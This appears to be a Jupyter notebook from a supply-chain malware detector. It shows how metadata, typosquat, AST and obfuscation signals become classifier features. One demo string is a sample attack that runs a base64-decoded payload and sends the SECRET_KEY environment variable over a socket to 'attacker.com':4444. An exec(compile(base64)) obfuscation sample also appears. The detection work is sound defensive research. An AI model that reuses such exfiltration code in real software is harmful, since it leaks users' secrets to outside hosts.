# Notebook 02 — Feature Engineering

This notebook demonstrates how the **supply-chain-detector** transforms raw package data into
numeric feature vectors for the downstream XGBoost classifier.

Each feature maps directly to one of the five detection layers:

| Feature | Source Layer | Description |
|---------|-------------|-------------|
| `metadata_score` | L1 — Metadata | Typosquat + author + version risk signals |
| `embedding_score` | L2 — Embeddings | FAISS L2 distance to benign code clusters |
| `static_score` | L3 — Static | AST + Semgrep + obfuscation signatures |
| `graph_score` | L5 — Graph | Dependency count proxy (dep_count × 5) |
| `name_length` | Metadata | Character count of the package name |
| `dep_count` | Metadata | Total declared dependencies |
| `author_missing` | Metadata | Binary — 1 if author field is empty |

In [ ]:
from pathlib import Path
import sys, json
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt

plt.rcParams.update({
    "figure.facecolor": "white",
    "axes.grid": True,
    "grid.alpha": 0.3,
    "axes.spines.top": False,
    "axes.spines.right": False,
})

# Resolve project root
cwd = Path.cwd()
candidates = [cwd, cwd.parent, cwd / "supply-chain-detector"]
PROJECT_ROOT = next((p for p in candidates if (p / "detector").exists()), cwd)
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from detector.layer1_metadata.metadata_analyzer import analyze_metadata_risk
from detector.layer1_metadata.typosquat_detector import analyze_typosquat
from detector.layer3_static.ast_analyzer import analyze_ast
from detector.layer3_static.obfuscation_detector import analyze_obfuscation
from detector.layer3_static.static_analyzer import analyze_static_risk
from detector.classifier import DEFAULT_FEATURE_NAMES

print(f"Project root: {PROJECT_ROOT}")
print(f"Classifier features ({len(DEFAULT_FEATURE_NAMES)}): {DEFAULT_FEATURE_NAMES}")

In [ ]:
DATA_DIR = PROJECT_ROOT / "data" / "processed"

with open(DATA_DIR / "malicious_normalized.json", "r", encoding="utf-8") as f:
    mal_records = json.load(f)
with open(DATA_DIR / "benign_normalized.json", "r", encoding="utf-8") as f:
    ben_records = json.load(f)

for r in mal_records:
    r.setdefault("label", "malicious")
for r in ben_records:
    r.setdefault("label", "benign")

all_records = mal_records + ben_records
print(f"Loaded {len(mal_records)} malicious + {len(ben_records)} benign = {len(all_records)} total")

## Layer 1 — Metadata Feature Extraction

The metadata analyzer combines three sub-signals with learned weights:

| Sub-analyzer | Weight | What it detects |
|-------------|--------|------------------|
| **Typosquat detector** | 0.40 | Levenshtein distance to the top-1000 popular packages |
| **Author analyzer** | 0.30 | Missing author, disposable emails, unknown maintainers |
| **Version analyzer** | 0.30 | Suspicious versioning patterns (e.g., single release at 0.0.1) |

Below we run the typosquat detector on a mix of real and adversarial package names.

In [ ]:
# Demonstrate typosquat detection on realistic cases
test_packages = [
    ("requests", "pypi"),     # Real popular package      -> should be safe
    ("requets", "pypi"),      # 1 edit from 'requests'    -> high risk
    ("reqeusts", "pypi"),     # 2 edits from 'requests'   -> moderate risk
    ("lodash", "npm"),        # Real popular package       -> safe
    ("1odash", "npm"),        # 1 edit from 'lodash'      -> high risk
    ("flask", "pypi"),        # Real popular package       -> safe
    ("flaask", "pypi"),       # 1 edit from 'flask'       -> high risk
]

typo_results = []
for pkg, reg in test_packages:
    result = analyze_typosquat(pkg, reg)
    typo_results.append({
        "package": pkg, "registry": reg,
        "risk_score": result["risk_score"],
        "nearest_match": result.get("nearest_package", "-"),
        "edit_distance": result.get("edit_distance", "-"),
        "suspicious": result["is_suspicious"],
    })

df_typo = pd.DataFrame(typo_results)
df_typo.style.background_gradient(subset=["risk_score"], cmap="RdYlGn_r")

In [ ]:
# Full metadata risk analysis on sample packages
sample_pkgs = [
    {"package_name": "numpy",    "registry": "pypi", "author": "NumPy Developers"},
    {"package_name": "numpyy",   "registry": "pypi", "author": ""},
    {"package_name": "express",  "registry": "npm",  "author": "TJ Holowaychuk"},
    {"package_name": "expresss", "registry": "npm",  "author": ""},
    {"package_name": "colorwin", "registry": "pypi", "author": ""},  # known malicious
]

meta_rows = []
for pkg in sample_pkgs:
    result = analyze_metadata_risk(pkg["package_name"], pkg["registry"], pkg)
    meta_rows.append({
        "package": pkg["package_name"],
        "has_author": bool(pkg.get("author")),
        "typosquat": result["layer_scores"]["typosquat"],
        "author": result["layer_scores"]["author"],
        "version": result["layer_scores"]["version"],
        "final_score": result["final_score"],
        "decision": result["decision"],
    })

print("Layer 1 — Metadata Risk Analysis")
pd.DataFrame(meta_rows).style.background_gradient(subset=["final_score"], cmap="RdYlGn_r")

## Layer 3 — Static Analysis Features

Three sub-analyzers inspect source code for suspicious patterns:

| Sub-analyzer | Weight | Signals detected |
|-------------|--------|------------------|
| **AST Analyzer** | 0.40 | `eval()`, `exec()`, `subprocess`, `socket`, `base64` calls |
| **Semgrep Runner** | 0.35 | Custom rules for supply-chain attack patterns |
| **Obfuscation Detector** | 0.25 | Base64 blobs, hex sequences, eval+compile chains, lambda abuse |

We demonstrate each sub-analyzer on representative code snippets below.

In [ ]:
# --- Benign code ---
benign_code = """import os\nimport json\n\ndef load_config(path):\n    with open(path, 'r') as f:\n        return json.load(f)\n\nconfig = load_config('settings.json')\nprint(config.get('app_name', 'MyApp'))\n"""

# --- Malicious code: typical supply-chain attack ---
malicious_code = """import subprocess\nimport socket\nimport base64\nimport os\n\nencoded = base64.b64decode('aW1wb3J0IG9z')\nsubprocess.call(['python', '-c', encoded.decode()])\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('attacker.com', 4444))\ndata = os.environ.get('SECRET_KEY', '')\nsock.send(data.encode())\n"""

print("=" * 50)
print("BENIGN CODE — AST Analysis")
print("=" * 50)
benign_ast = analyze_ast(benign_code)
print(f"  Risk score : {benign_ast['risk_score']}")
print(f"  Suspicious : {benign_ast['is_suspicious']}")
print(f"  Call counts: {benign_ast['feature_vector']}")

print()
print("=" * 50)
print("MALICIOUS CODE — AST Analysis")
print("=" * 50)
mal_ast = analyze_ast(malicious_code)
print(f"  Risk score : {mal_ast['risk_score']}")
print(f"  Suspicious : {mal_ast['is_suspicious']}")
print(f"  Call counts: {mal_ast['feature_vector']}")
print(f"  Evidence:")
for e in mal_ast["evidence"]:
    print(f"    - {e}")

In [ ]:
# Obfuscation detection demo
# Build a sample with multiple obfuscation signals:
#   - Long base64 blob (>200 chars)
#   - eval(compile()) chain
#   - Heavy lambda usage (>10)

long_b64 = 'A' * 260  # 260-char base64-like blob
lambda_lines = '\n'.join([f'fn{i} = lambda x: x + {i}' for i in range(15)])

obfuscated_code = f"""import base64\nexec(compile(base64.b64decode('{long_b64}'), '<string>', 'exec'))\n{lambda_lines}\n"""

print("=" * 50)
print("OBFUSCATION DETECTION")
print("=" * 50)
obf = analyze_obfuscation(obfuscated_code)
print(f"  Risk score: {obf['risk_score']}")
print(f"  Signals:    {obf['signals']}")
for e in obf["evidence"]:
    print(f"  - {e}")

## Building the Complete Feature Vector

The `detector/classifier.py` module combines all layer scores into a **7-dimensional feature
vector** — the same representation used in both training (`ml/train_classifier.py`) and
production inference.

```python
[metadata_score, embedding_score, static_score, graph_score, name_length, dep_count, author_missing]
```

**Note on source code availability:** Our normalized dataset primarily contains package metadata
(names, registries, labels). Source code is fetched **on-demand** during live API scans via
tarball extraction. In this offline analysis, `embedding_score` and `static_score` use the same
heuristic proxies as the training pipeline when source code is unavailable.

In [ ]:
CACHE_PATH = PROJECT_ROOT / "data" / "processed" / "notebook_cache" / "features_all.csv"

if CACHE_PATH.exists():
    # Load pre-computed features (instant)
    df_feat = pd.read_csv(CACHE_PATH)
    print(f"Loaded pre-computed features from cache: {df_feat.shape[0]} rows × {len(DEFAULT_FEATURE_NAMES)} features")
else:
    # Fallback: compute features on the fly (takes ~45s)
    print("Cache not found — computing features (this will take ~45 seconds)...")
    def extract_features(record: dict) -> dict:
        package_name = str(record.get("package_name", "")).strip().lower()
        registry = str(record.get("registry", "")).strip().lower()
        source_code = str(record.get("source_code", ""))
        dep_count = 0
        if isinstance(record.get("dependencies"), dict):
            dep_count += len(record["dependencies"])
        if isinstance(record.get("requires_dist"), list):
            dep_count += len(record["requires_dist"])

        metadata_score = float(analyze_metadata_risk(package_name, registry, record).get("final_score", 0.0))
        static_score = float(analyze_static_risk(source_code).get("final_score", 0.0)) if source_code.strip() else 0.0
        embedding_score = (25.0 if len(source_code) < 200 else 10.0) if source_code.strip() else 0.0
        graph_score = min(float(dep_count) * 5.0, 100.0)
        return {
            "metadata_score": metadata_score, "embedding_score": embedding_score,
            "static_score": static_score, "graph_score": graph_score,
            "name_length": float(len(package_name)), "dep_count": float(dep_count),
            "author_missing": float(0 if record.get("author") else 1),
        }

    feature_rows = []
    for i, record in enumerate(all_records):
        feats = extract_features(record)
        feats["label"] = record.get("label", "unknown")
        feats["package_name"] = record.get("package_name", "")
        feature_rows.append(feats)
        if (i + 1) % 100 == 0:
            print(f"  Processed {i + 1}/{len(all_records)}")
    df_feat = pd.DataFrame(feature_rows)

print(f"\nFeature matrix: {df_feat.shape[0]} rows × {len(DEFAULT_FEATURE_NAMES)} features")
df_feat.groupby("label")[list(DEFAULT_FEATURE_NAMES)].describe().round(2).T

## Feature Distributions by Label

Visualizing how each feature separates benign from malicious packages.
Clear separation indicates high discriminative power for the classifier.

In [ ]:
fig, axes = plt.subplots(2, 4, figsize=(18, 8))
axes = axes.flatten()

for i, feature in enumerate(DEFAULT_FEATURE_NAMES):
    ax = axes[i]
    for label, color in [("benign", "#2ecc71"), ("malicious", "#e74c3c")]:
        subset = df_feat[df_feat["label"] == label][feature]
        ax.hist(subset, bins=25, alpha=0.6, color=color, label=label, edgecolor="white")
    ax.set_title(feature, fontsize=10, fontweight="bold")
    ax.legend(fontsize=8)

axes[-1].set_visible(False)  # hide unused 8th subplot

fig.suptitle("Feature Distributions: Benign vs Malicious", fontsize=14, fontweight="bold", y=1.01)
plt.tight_layout()
plt.show()

In [ ]:
# Feature correlation matrix (pure matplotlib — no seaborn)
corr = df_feat[list(DEFAULT_FEATURE_NAMES)].corr()

fig, ax = plt.subplots(figsize=(8, 6))
im = ax.imshow(corr, cmap="coolwarm", vmin=-1, vmax=1, aspect="auto")

ax.set_xticks(range(len(corr.columns)))
ax.set_yticks(range(len(corr.columns)))
ax.set_xticklabels(corr.columns, rotation=45, ha="right", fontsize=8)
ax.set_yticklabels(corr.columns, fontsize=8)

# Add correlation values as text
for i in range(len(corr)):
    for j in range(len(corr)):
        ax.text(j, i, f"{corr.iloc[i, j]:.2f}", ha="center", va="center", fontsize=8,
                color="white" if abs(corr.iloc[i, j]) > 0.5 else "black")

fig.colorbar(im, ax=ax, shrink=0.8)
ax.set_title("Feature Correlation Matrix", fontsize=13, fontweight="bold")
plt.tight_layout()
plt.show()

## Key Takeaways

1. **`metadata_score` is the strongest offline signal** — driven primarily by typosquat proximity
   to known popular packages. Most malicious packages in our dataset are name-squatters.

2. **`author_missing` provides a clean binary signal** — many malicious packages omit author
   information, while established packages almost always have it.

3. **`name_length`** shows subtle differences — typosquat names are typically close in length
   to their targets (popular packages tend to have short names).

4. **`static_score` and `embedding_score`** are largely zero in this offline dataset because
   source code is not included in the metadata collection step. In the live API pipeline,
   these features activate when source is extracted from package tarballs.

5. **Low inter-feature correlation** — each feature captures independent risk signals,
   validating the multi-layer architecture.

---
*Next: [03_embedding_clustering.ipynb](03_embedding_clustering.ipynb) — visualize how code
embeddings separate benign from malicious in latent space.*